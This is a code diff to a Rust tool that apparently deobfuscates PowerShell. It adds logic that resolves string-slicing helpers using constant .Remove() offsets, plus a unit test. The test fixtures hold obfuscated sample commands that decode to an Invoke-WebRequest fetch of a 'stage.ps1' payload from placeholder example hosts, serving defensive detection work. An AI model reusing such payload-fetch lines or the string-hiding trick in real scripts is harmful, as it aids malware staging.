@@ -1039,6 +1039,14 @@ static PS_LITERAL_REMOVE_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
 });
 
 #[allow(clippy::expect_used)]
+static PS_LITERAL_CONST_REMOVE_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\.\s*Remove\s*\(\s*(\d{1,6})(?:\s*,\s*(\d{1,6}))?\s*\)"#,
+    )
+    .expect("ps literal const remove extractor body regex")
+});
+
+#[allow(clippy::expect_used)]
 static PS_LITERAL_INSERT_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
         r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\.\s*Insert\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*,\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)"#,
@@ -3525,41 +3533,64 @@ fn expand_literal_remove_extractor_calls(text: &str) -> String {
 
     let mut out = text.to_string();
     for (name, params, body) in literal_substring_extractor_defs(text).into_iter().take(32) {
-        let Some(caps) = PS_LITERAL_REMOVE_EXTRACTOR_BODY_RE.captures(&body) else {
+        if let Some(caps) = PS_LITERAL_REMOVE_EXTRACTOR_BODY_RE.captures(&body) {
+            let Some(value_var) = caps.get(1).map(|m| m.as_str()) else {
+                continue;
+            };
+            let Some(start_var) = caps.get(2).map(|m| m.as_str()) else {
+                continue;
+            };
+            let count_var = caps.get(3).map(|m| m.as_str());
+
+            let param_index = parse_ps_function_param_indices(&params);
+            let Some(value_idx) = param_index.get(&value_var.to_ascii_lowercase()).copied() else {
+                continue;
+            };
+            let Some(start_idx) = param_index.get(&start_var.to_ascii_lowercase()).copied() else {
+                continue;
+            };
+            let count_idx = match count_var {
+                Some(count_var) => {
+                    match param_index.get(&count_var.to_ascii_lowercase()).copied() {
+                        Some(idx) => Some(idx),
+                        None => continue,
+                    }
+                }
+                None => None,
+            };
+
+            let binding = PsRemoveExtractorParamBinding {
+                value_idx,
+                value_name: value_var,
+                start_idx,
+                start_name: start_var,
+                count_idx,
+                count_name: count_var,
+            };
+            out = inline_ps_literal_remove_calls(&out, &name, binding);
+            continue;
+        }
+
+        let Some(caps) = PS_LITERAL_CONST_REMOVE_EXTRACTOR_BODY_RE.captures(&body) else {
             continue;
         };
         let Some(value_var) = caps.get(1).map(|m| m.as_str()) else {
             continue;
         };
-        let Some(start_var) = caps.get(2).map(|m| m.as_str()) else {
+        let Some(start) = caps.get(2).and_then(|m| m.as_str().parse::<usize>().ok()) else {
             continue;
         };
-        let count_var = caps.get(3).map(|m| m.as_str());
+        let count = caps.get(3).and_then(|m| m.as_str().parse::<usize>().ok());
+        if start > 8192 || count.is_some_and(|count| count > 8192) {
+            continue;
+        }
 
         let param_index = parse_ps_function_param_indices(&params);
         let Some(value_idx) = param_index.get(&value_var.to_ascii_lowercase()).copied() else {
             continue;
         };
-        let Some(start_idx) = param_index.get(&start_var.to_ascii_lowercase()).copied() else {
-            continue;
-        };
-        let count_idx = match count_var {
-            Some(count_var) => match param_index.get(&count_var.to_ascii_lowercase()).copied() {
-                Some(idx) => Some(idx),
-                None => continue,
-            },
-            None => None,
-        };
 
-        let binding = PsRemoveExtractorParamBinding {
-            value_idx,
-            value_name: value_var,
-            start_idx,
-            start_name: start_var,
-            count_idx,
-            count_name: count_var,
-        };
-        out = inline_ps_literal_remove_calls(&out, &name, binding);
+        out = inline_ps_literal_const_remove_calls(&out, &name, value_idx, value_var, start, count);
     }
     out
 }
@@ -4336,6 +4367,132 @@ fn ps_literal_const_substring_replacement(
         return None;
     }
     Some(format!("'{}'", value[start..end].replace('\'', "''")))
+}
+
+fn inline_ps_literal_const_remove_calls(
+    text: &str,
+    name: &str,
+    value_idx: usize,
+    value_name: &str,
+    start: usize,
+    count: Option<usize>,
+) -> String {
+    let lower = text.to_ascii_lowercase();
+    let needles = ps_literal_extractor_call_needles(text, name);
+    let bytes = text.as_bytes();
+    let mut matches = Vec::new();
+    let mut match_count = 0;
+
+    for needle in needles {
+        let mut search_from = 0;
+        while match_count < 128 {
+            let Some(rel) = lower[search_from..].find(&needle) else {
+                break;
+            };
+            let call_start = search_from + rel;
+            let end_name = call_start + needle.len();
+            let Some((replace_start, mut pos)) =
+                ps_literal_extractor_call_start_and_arg_pos(bytes, call_start, end_name)
+            else {
+                search_from = end_name;
+                continue;
+            };
+            let parenthesized = bytes.get(pos) == Some(&b'(');
+            if parenthesized {
+                pos = skip_ascii_ws(bytes, pos + 1);
+            }
+            if bytes.get(pos) == Some(&b'-') {
+                if let Some((call_end, replacement)) = inline_ps_named_literal_const_remove_call(
+                    text,
+                    pos,
+                    parenthesized,
+                    value_name,
+                    start,
+                    count,
+                ) {
+                    matches.push((replace_start, call_end, replacement));
+                    search_from = call_end;
+                    match_count += 1;
+                    continue;
+                }
+            }
+            let Some((value_end, value)) = parse_ps_static_quoted_literal(text, pos) else {
+                search_from = end_name;
+                continue;
+            };
+            let mut call_end = value_end;
+            if parenthesized {
+                let after = skip_ascii_ws(bytes, call_end);
+                if bytes.get(after) != Some(&b')') {
+                    search_from = value_end;
+                    continue;
+                }
+                call_end = after + 1;
+            }
+            if value_idx != 0 {
+                search_from = call_end;
+                continue;
+            }
+            let Some(replacement) = ps_literal_const_remove_replacement(&value, start, count)
+            else {
+                search_from = call_end;
+                continue;
+            };
+            matches.push((replace_start, call_end, replacement));
+            search_from = call_end;
+            match_count += 1;
+        }
+    }
+
+    let mut out = text.to_string();
+    for (start, end, replacement) in matches.into_iter().rev() {
+        out.replace_range(start..end, &replacement);
+    }
+    out
+}
+
+fn inline_ps_named_literal_const_remove_call(
+    text: &str,
+    pos: usize,
+    parenthesized: bool,
+    value_name: &str,
+    start: usize,
+    count: Option<usize>,
+) -> Option<(usize, String)> {
+    let (call_end, args) = parse_ps_named_static_literal_args(text, pos, parenthesized, 2)?;
+    let value = args
+        .iter()
+        .find(|(name, _)| name.eq_ignore_ascii_case(value_name))?
+        .1
+        .as_str();
+    Some((
+        call_end,
+        ps_literal_const_remove_replacement(value, start, count)?,
+    ))
+}
+
+fn ps_literal_const_remove_replacement(
+    value: &str,
+    start: usize,
+    count: Option<usize>,
+) -> Option<String> {
+    if value.len() > 8192 || start > 8192 || count.is_some_and(|count| count > 8192) {
+        return None;
+    }
+    if start > value.len() || !value.is_char_boundary(start) {
+        return None;
+    }
+    let remove_end = match count {
+        Some(count) => start.checked_add(count)?,
+        None => value.len(),
+    };
+    if remove_end > value.len() || !value.is_char_boundary(remove_end) {
+        return None;
+    }
+    let mut out = String::with_capacity(value.len().saturating_sub(remove_end - start));
+    out.push_str(&value[..start]);
+    out.push_str(&value[remove_end..]);
+    (out.len() <= 8192).then(|| format!("'{}'", out.replace('\'', "''")))
 }
 
 fn ps_literal_extractor_call_needles(text: &str, name: &str) -> Vec<String> {
@@ -8929,6 +9086,24 @@ Cut 'Invoke-JUNKWebRequest -Uri https://ps-remove-extractor.example/stage.ps1' 7
         assert!(
             out.contains(&format!("'{decoded}'")),
             "literal remove extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_constant_remove_extractor_call_is_rewritten() {
+        let decoded = "Invoke-WebRequest -Uri https://ps-const-remove-extractor.example/stage.ps1";
+        let text = format!(
+            r#"function Cut($value) {{
+  return $value.Remove(0,2)
+}}
+Cut 'xx{decoded}'"#
+        );
+
+        let out = expand_literal_remove_extractor_calls(&text);
+
+        assert!(
+            out.contains(&format!("'{decoded}'")),
+            "literal constant remove extractor call was not rewritten:\n{out}"
         );
     }
 
